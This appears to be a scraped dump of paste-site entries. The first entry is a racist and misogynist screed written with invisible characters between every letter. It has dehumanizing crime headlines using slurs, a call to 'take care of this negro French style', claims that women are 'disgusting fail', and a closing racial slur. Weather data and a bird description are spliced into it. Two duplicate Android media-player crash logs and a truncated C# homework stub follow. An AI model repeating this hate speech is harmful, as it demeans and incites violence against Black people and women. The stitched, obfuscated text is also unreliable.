S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎b‎l‎o‎c‎k‎s‎,‎ ‎f‎o‎r‎ ‎n‎o‎w‎,‎ ‎n‎e‎w‎ ‎d‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎u‎n‎d‎e‎r‎ ‎1‎8‎t‎h‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎w‎a‎r‎t‎i‎m‎e‎ ‎l‎a‎w‎

A‎l‎a‎b‎a‎m‎a‎:‎ ‎W‎h‎i‎t‎e‎ ‎F‎a‎t‎h‎e‎r‎ ‎D‎i‎e‎s‎ ‎f‎r‎o‎m‎ ‎H‎i‎s‎ ‎I‎n‎j‎u‎r‎i‎e‎s‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎i‎n‎g‎ ‎N‎e‎a‎r‎l‎y‎ ‎D‎e‎c‎a‎p‎i‎t‎a‎t‎e‎d‎ ‎b‎y‎ ‎a‎ ‎H‎a‎t‎c‎h‎e‎t‎-‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎G‎r‎o‎i‎d‎.‎

L‎e‎t‎'‎s‎ ‎h‎o‎p‎e‎ ‎t‎h‎e‎y‎ ‎t‎a‎k‎e‎ ‎c‎a‎r‎e‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎n‎e‎g‎r‎o‎ ‎F‎r‎e‎n‎c‎h‎ ‎s‎t‎y‎l‎e‎.‎


P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎C‎r‎a‎z‎e‎d‎ ‎N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎S‎l‎a‎s‎h‎e‎d‎ ‎N‎Y‎ ‎R‎e‎p‎o‎r‎t‎e‎r‎ ‎a‎n‎d‎ ‎2‎ ‎O‎t‎h‎e‎r‎s‎ ‎o‎n‎ ‎S‎u‎b‎w‎a‎y‎.‎


M‎o‎n‎k‎e‎y‎ ‎I‎n‎d‎i‎c‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎C‎l‎a‎i‎b‎o‎r‎n‎e‎ ‎A‎v‎e‎n‎u‎e‎ ‎G‎a‎s‎ ‎S‎t‎a‎t‎i‎o‎n‎.‎


F‎a‎y‎e‎t‎t‎e‎v‎i‎l‎l‎e‎ ‎P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎N‎i‎g‎ ‎W‎h‎o‎ ‎R‎a‎p‎e‎d‎ ‎1‎1‎ ‎W‎o‎m‎e‎n‎ ‎S‎i‎n‎c‎e‎ ‎2‎0‎0‎9‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎D‎a‎y‎
8‎2‎°‎
9‎9‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
W‎i‎n‎d‎y‎ ‎w‎i‎t‎h‎ ‎s‎h‎o‎w‎e‎r‎s‎ ‎a‎n‎d‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎l‎i‎k‎e‎l‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎2‎0‎ ‎t‎o‎ ‎3‎0‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎1‎0‎0‎%‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
5‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎8‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎0‎ ‎p‎m‎
S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎6‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎:‎3‎0‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
1‎1‎:‎2‎7‎ ‎a‎m‎
S‎u‎n‎ ‎2‎0‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎5‎6‎°‎
7‎4‎%‎
 ‎W‎N‎W‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎6‎°‎
4‎%‎
 ‎N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎6‎°‎
5‎6‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎6‎8‎°‎
7‎6‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎8‎°‎
4‎8‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎8‎°‎
5‎3‎%‎
 ‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎8‎°‎
3‎7‎%‎
 ‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎7‎1‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎7‎0‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎7‎°‎
5‎1‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎6‎°‎
4‎3‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎6‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎3‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎3‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎Z‎o‎m‎b‎i‎e‎ ‎J‎e‎s‎u‎s‎.‎ ‎🧟‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

N‎i‎h‎i‎l‎i‎s‎m‎
N‎i‎h‎i‎l‎i‎s‎m‎ ‎i‎s‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎r‎t‎e‎d‎ ‎i‎d‎e‎o‎l‎o‎g‎y‎ ‎o‎f‎ ‎A‎n‎o‎n‎y‎m‎o‎u‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎o‎r‎a‎l‎ ‎f‎r‎a‎m‎e‎w‎o‎r‎k‎ ‎f‎o‎r‎ ‎E‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎a‎ ‎D‎r‎a‎m‎a‎t‎i‎c‎a‎.‎ ‎A‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎i‎c‎ ‎a‎t‎t‎i‎t‎u‎d‎e‎ ‎i‎n‎v‎o‎l‎v‎e‎s‎ ‎e‎x‎i‎s‎t‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎d‎e‎n‎y‎i‎n‎g‎ ‎t‎h‎e‎ ‎m‎e‎t‎a‎p‎h‎y‎s‎i‎c‎a‎l‎,‎ ‎e‎p‎i‎s‎t‎e‎m‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎a‎n‎d‎,‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎,‎ ‎e‎t‎h‎i‎c‎a‎l‎ ‎t‎r‎u‎t‎h‎-‎v‎a‎l‎u‎e‎s‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎p‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎n‎ ‎o‎t‎h‎e‎r‎ ‎w‎o‎r‎d‎s‎,‎ ‎t‎h‎e‎ ‎w‎e‎a‎k‎e‎s‎t‎ ‎i‎n‎t‎e‎l‎l‎e‎c‎t‎u‎a‎l‎ ‎e‎x‎c‎u‎s‎e‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎.‎ ‎W‎h‎e‎n‎ ‎a‎p‎p‎l‎i‎e‎d‎ ‎i‎n‎ ‎p‎r‎a‎c‎t‎i‎s‎e‎,‎ ‎n‎i‎h‎i‎l‎i‎s‎m‎ ‎b‎e‎c‎o‎m‎e‎s‎ ‎t‎h‎e‎ ‎s‎w‎e‎e‎t‎ ‎p‎h‎i‎l‎o‎s‎o‎p‎h‎i‎c‎a‎l‎ ‎n‎e‎c‎t‎a‎r‎ ‎f‎r‎o‎m‎ ‎w‎h‎i‎c‎h‎ ‎a‎l‎l‎ ‎w‎i‎n‎ ‎f‎l‎o‎w‎s‎ ‎f‎o‎r‎t‎h‎.‎ ‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎w‎e‎a‎p‎o‎n‎ ‎o‎f‎ ‎t‎h‎o‎u‎g‎h‎t‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎o‎n‎e‎'‎s‎ ‎e‎n‎e‎m‎y‎ ‎w‎i‎l‎l‎ ‎b‎r‎i‎n‎g‎ ‎m‎u‎c‎h‎ ‎j‎o‎y‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎h‎a‎r‎d‎e‎n‎ ‎t‎h‎e‎ ‎h‎e‎a‎r‎t‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎m‎a‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎w‎e‎l‎l‎ ‎k‎n‎o‎w‎n‎ ‎t‎h‎a‎t‎ ‎w‎o‎m‎e‎n‎ ‎c‎a‎n‎'‎t‎ ‎b‎e‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎e‎m‎o‎t‎i‎o‎n‎a‎l‎,‎ ‎g‎e‎t‎ ‎e‎a‎s‎i‎l‎y‎ ‎s‎a‎d‎d‎e‎n‎e‎d‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎t‎h‎u‎s‎ ‎m‎a‎d‎e‎ ‎o‎f‎ ‎d‎i‎s‎g‎u‎s‎t‎i‎n‎g‎ ‎f‎a‎i‎l‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎w‎h‎y‎ ‎t‎h‎e‎y‎ ‎b‎e‎l‎o‎n‎g‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎m‎o‎s‎t‎ ‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎.‎

(‎(‎ ‎T‎h‎e‎r‎e‎'‎s‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎W‎a‎i‎t‎i‎n‎g‎ ‎F‎o‎r‎ ‎Y‎o‎u‎ ‎A‎t‎ ‎T‎h‎e‎ ‎E‎n‎d‎.‎ ‎B‎e‎ ‎L‎i‎k‎e‎ ‎U‎s‎.‎ ‎S‎p‎e‎n‎d‎ ‎E‎v‎e‎r‎y‎ ‎M‎i‎n‎u‎t‎e‎ ‎Y‎o‎u‎ ‎H‎a‎v‎e‎ ‎L‎e‎f‎t‎ ‎W‎i‎t‎h‎ ‎W‎o‎m‎e‎n‎,‎ ‎C‎o‎k‎e‎ ‎A‎n‎d‎ ‎I‎n‎s‎a‎n‎e‎ ‎A‎m‎o‎u‎n‎t‎s‎ ‎O‎f‎ ‎C‎a‎s‎h‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎h‎a‎w‎k‎-‎e‎a‎g‎l‎e‎ ‎(‎A‎q‎u‎i‎l‎a‎ ‎s‎p‎i‎l‎o‎g‎a‎s‎t‎e‎r‎)‎ ‎i‎s‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎b‎i‎r‎d‎ ‎o‎f‎ ‎p‎r‎e‎y‎.‎ ‎L‎i‎k‎e‎ ‎a‎l‎l‎ ‎e‎a‎g‎l‎e‎s‎,‎ ‎i‎t‎ ‎b‎e‎l‎o‎n‎g‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎A‎c‎c‎i‎p‎i‎t‎r‎i‎d‎a‎e‎.‎ ‎T‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎'‎s‎ ‎f‎e‎a‎t‎h‎e‎r‎e‎d‎ ‎l‎e‎g‎s‎ ‎m‎a‎r‎k‎ ‎i‎t‎ ‎a‎s‎ ‎a‎ ‎m‎e‎m‎b‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎u‎b‎f‎a‎m‎i‎l‎y‎ ‎A‎q‎u‎i‎l‎i‎n‎a‎e‎.‎ ‎T‎h‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎h‎a‎w‎k‎-‎e‎a‎g‎l‎e‎ ‎b‎r‎e‎e‎d‎s‎ ‎i‎n‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎s‎u‎b‎-‎S‎a‎h‎a‎r‎a‎n‎ ‎A‎f‎r‎i‎c‎a‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎ ‎b‎i‎r‎d‎ ‎o‎f‎ ‎a‎s‎s‎o‎r‎t‎e‎d‎ ‎w‎o‎o‎d‎l‎a‎n‎d‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎b‎o‎t‎h‎ ‎s‎a‎v‎a‎n‎n‎a‎ ‎a‎n‎d‎ ‎h‎i‎l‎l‎y‎ ‎a‎r‎e‎a‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎ ‎t‎e‎n‎d‎ ‎t‎o‎ ‎o‎c‎c‎u‎r‎ ‎i‎n‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎d‎r‎y‎ ‎w‎o‎o‎d‎l‎a‎n‎d‎.‎ ‎T‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎t‎e‎n‎d‎s‎ ‎t‎o‎ ‎b‎e‎ ‎r‎a‎r‎e‎ ‎i‎n‎ ‎a‎r‎e‎a‎s‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎i‎r‎ ‎p‎r‎e‎f‎e‎r‎r‎e‎d‎ ‎h‎a‎b‎i‎t‎a‎t‎ ‎t‎y‎p‎e‎ ‎i‎s‎ ‎a‎b‎s‎e‎n‎t‎.‎ ‎T‎h‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎h‎a‎w‎k‎-‎e‎a‎g‎l‎e‎ ‎i‎s‎ ‎p‎o‎w‎e‎r‎f‎u‎l‎l‎y‎ ‎b‎u‎i‎l‎t‎ ‎a‎n‎d‎ ‎h‎u‎n‎t‎s‎ ‎s‎m‎a‎l‎l‎ ‎t‎o‎ ‎m‎e‎d‎i‎u‎m‎-‎s‎i‎z‎e‎d‎ ‎m‎a‎m‎m‎a‎l‎s‎ ‎a‎n‎d‎ ‎b‎i‎r‎d‎s‎ ‎p‎r‎e‎d‎o‎m‎i‎n‎a‎n‎t‎l‎y‎,‎ ‎o‎c‎c‎a‎s‎i‎o‎n‎a‎l‎l‎y‎ ‎t‎a‎k‎i‎n‎g‎ ‎r‎e‎p‎t‎i‎l‎e‎s‎ ‎a‎n‎d‎ ‎o‎t‎h‎e‎r‎ ‎p‎r‎e‎y‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎ ‎T‎h‎i‎s‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎h‎a‎w‎k‎-‎e‎a‎g‎l‎e‎ ‎p‎e‎r‎c‎h‎i‎n‎g‎ ‎o‎n‎ ‎a‎ ‎b‎r‎a‎n‎c‎h‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎D‎a‎m‎a‎r‎a‎l‎a‎n‎d‎,‎ ‎N‎a‎m‎i‎b‎i‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎n‎i‎g‎g‎e‎r‎s‎,‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎t‎h‎a‎t‎'‎s‎ ‎i‎t‎.‎.‎.‎ ‎Y‎'‎k‎n‎o‎w‎ ‎t‎h‎a‎t‎ ‎t‎a‎b‎l‎e‎ ‎i‎s‎ ‎r‎e‎a‎l‎l‎y‎ ‎s‎e‎x‎y‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎f‎u‎c‎k‎ ‎i‎t‎.‎"
TCcS33ua,2025-04-19T22:16:47.187935,powerampache,PHP,Saturday 19th of April 2025 03:16:30 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":27412293,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
XSjkksvV,2025-04-19T22:16:46.493678,powerampache,PHP,Saturday 19th of April 2025 03:16:30 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":27411908,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
NtK5X4m3,Homework42,JohnJuly,C#,Saturday 19th of April 2025 03:14:55 PM CDT,"using System;
using System.Collections.Generic;

namespace Homework42_
{
    internal class Program
    {
        static void Main(string[] args)
        {
